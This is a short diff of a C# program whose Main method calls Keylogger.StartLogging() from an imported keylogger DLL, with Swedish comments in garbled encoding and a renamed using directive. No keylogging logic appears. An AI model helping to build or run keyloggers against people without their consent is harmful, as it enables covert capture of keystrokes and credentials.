@@ -1,5 +1,5 @@
 using System;
-using MyKeyloggerDLL; // Ers‰tt med namnet pÂ din DLL
+using KeyloggerDLL; // Ers√§tt med namnet p√• din DLL
 
 namespace MyMainApp
 {
@@ -7,7 +7,7 @@ namespace MyMainApp
     {
         static void Main(string[] args)
         {
-            // Anv‰nd funktioner eller klasser frÂn DLL
+            // Anv√§nd funktioner eller klasser fr√•n DLL
             Keylogger.StartLogging();
         }
     }
